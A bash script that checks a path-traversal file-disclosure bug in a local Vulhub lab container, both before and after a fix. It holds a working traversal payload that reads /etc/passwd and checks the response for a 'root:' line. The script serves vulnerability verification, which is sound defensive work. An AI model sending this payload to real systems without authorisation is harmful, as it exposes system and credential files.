#!/usr/bin/env bash
# Local-only, read-only probes matching Vulhub's file-disclosure example.
set -euo pipefail
phase="${1:?Usage: verify_cve.sh vulnerable|fixed [output-directory]}"
[[ "$phase" == vulnerable || "$phase" == fixed ]] || exit 2
out="${2:-evidence/cve-$phase}"
mkdir -p "$out"
base=http://127.0.0.1:18080
curl_args=(--noproxy '*' --silent --show-error --max-time 10 --path-as-is)
probe() {
  local name="$1" path="$2"
  curl "${curl_args[@]}" -D "$out/$name.headers" -o "$out/$name.body" -w '%{http_code}' "$base$path" > "$out/$name.status"
  printf '%-12s HTTP %s\n' "$name" "$(cat "$out/$name.status")"
}
probe homepage /
[[ "$(cat "$out/homepage.status")" == 200 ]]
grep -q 'It works!' "$out/homepage.body"
probe traversal '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
if [[ "$phase" == vulnerable ]]; then
  [[ "$(cat "$out/traversal.status")" == 200 ]]
  grep -q '^root:' "$out/traversal.body"
  printf 'PASS: vulnerable container disclosed its /etc/passwd.\n'
else
  status=$(cat "$out/traversal.status")
  [[ "$status" == 400 || "$status" == 403 || "$status" == 404 ]]
  ! grep -q '^root:' "$out/traversal.body"
  printf 'PASS: the original traversal request is blocked; homepage still works.\n'
fi
